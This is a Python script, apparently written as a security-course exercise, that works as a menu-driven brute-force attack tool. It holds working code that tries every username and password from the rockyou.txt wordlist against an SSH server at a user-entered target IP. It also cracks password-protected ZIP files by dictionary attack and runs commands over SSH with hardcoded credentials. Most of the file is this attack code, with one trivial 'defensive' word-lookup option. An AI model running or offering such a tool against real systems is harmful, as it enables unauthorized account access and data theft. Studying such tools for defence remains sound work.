#!/usr/bin/env python3 

# Script Name:                  Automated Brute Force Wordlist Attack Tool Part 3 of 3
# Author:                       Heraldo Morales
# Date of latest revision:      01/31/24
# Purpose:                      Develop a custom tool that performs brute force attacks to better understand the types of automation employed by adversaries.

# Imports necessary modules
import paramiko
import time
import ssl
import zipfile

# Function which connects to SSH server, executes command, captures output, prints command and output. Writes output to a file and returns output file name.
def paramiko_GKG(hostname, command, output_file):
    print('running')
    try:
        port = '22'
        client = paramiko.SSHClient()
        client.load_system_host_keys()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname, port=22, username='geeksForgeeks', password='geeksForgeeks')
        (stdin, stdout, stderr) = client.exec_command(command)
        cmd_output = stdout.read()
        print('log printing: ', command, cmd_output)
        with open(output_file, "w+") as file:
            file.write(str(cmd_output))
        return output_file
    finally:
        client.close()

# Function performs a brute force ssh attack by searching through provided usernames and passwords, attempts to connect to an ssh server using combinations and prints results.
def paramiko_GKG_bruteforce(hostname, usernames, passwords):
    print('Brute-force attack running')
    try:
        port = '22'
        client = paramiko.SSHClient()
        client.load_system_host_keys()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        for username in usernames:
            for password in passwords:
                try:
                    client.connect(hostname, port=22, username=username, password=password)
                    print(f'Successful login: {username}@{hostname} with password: {password}')
                    return True
                except paramiko.AuthenticationException:
                    print(f'Failed login attempt: {username}@{hostname} with password: {password}')
                except Exception as e:
                    print(f'Error: {e}')

        print('Brute-force attack completed. No valid credentials found.')
        return False

    finally:
        client.close()

# Function prompts user for dictionary file path, opens specified file, reads lines, removes trailing whitespaces. Assigns line to a variable 'word'. Prints word to screen, introduces delay of second and repeats process until are lines in file are processed.
def iterator():
    filepath = input("Enter your dictionary filepath:\n")
    with open(filepath, encoding="ISO-8859-1") as file:
        for line in file:
            word = line.rstrip()
            print(word)
            time.sleep(1)

# Function takes a list of words as input, prompts user to enter word, checks if entered word is in provided list and prints corresponding message
def check_for_word(words):
    user_answer = input("Enter a word: ")
    if user_answer in words:
        print("The word is in the dictionary")
    else:
        print("The word is not in the dictionary")

# Function reads contents of file 'rockyou.txt', initializes an empty list named password_list, opens specified file in read mode, reads each line, removes trailing whitespaces, appends it to password_list, and prints list and continues reading until end of file.
def load_external_file():
    password_list = []
    with open('rockyou.txt', 'r', encoding="ISO-8859-1") as file:
        for line in file:
            password_list.append(line.rstrip())
    return password_list

# Function performs a brute force attack on a password-protected zip file using a list of passwords.
def brute_force_zip(zip_filepath, password_list):
    with zipfile.ZipFile(zip_filepath, 'r') as zip_ref:
        for password in password_list:
            try:
                zip_ref.extractall(pwd=password.encode('utf-8'))
                print(f'Success! The password is: {password}')
                return True
            except (RuntimeError, zipfile.BadZipFile):
                continue
            except zipfile.BadZipFile as e:
                print(f'Error: {e}')
                return False
        print('Failed to brute force the zip file.')
        return False

# Main execution. Presents menu to user with options for different functions. Uses while loops to keep prompting until user exits. 
if __name__ == "__main__":
    while True:
        mode = input("""
Brute Force Wordlist Attack Tool Menu
1 - Offensive, Dictionary Iterator
2 - Offensive, Brute Force SSH Attack
3 - Defensive, Password Recognized
4 - Offensive, Brute Force ZIP File
5 - Exit
Please enter a number: 
""")
        if mode == "1":
            iterator()
        elif mode == "2":
            hostname = input("Enter the target IP address: ")
            usernames = input("Enter a list of usernames (comma-separated): ").split(',')
            passwords = load_external_file()
            paramiko_GKG_bruteforce(hostname, usernames, passwords)
        elif mode == "3":
            word_list = load_external_file()
            check_for_word(word_list)
        elif mode == "4":
            zip_filepath = input("Enter the path to the password-protected zip file: ")
            passwords = load_external_file()
            brute_force_zip(zip_filepath, passwords)
        elif mode == '5':
            break
        else:
            print("Invalid selection...")

# Done
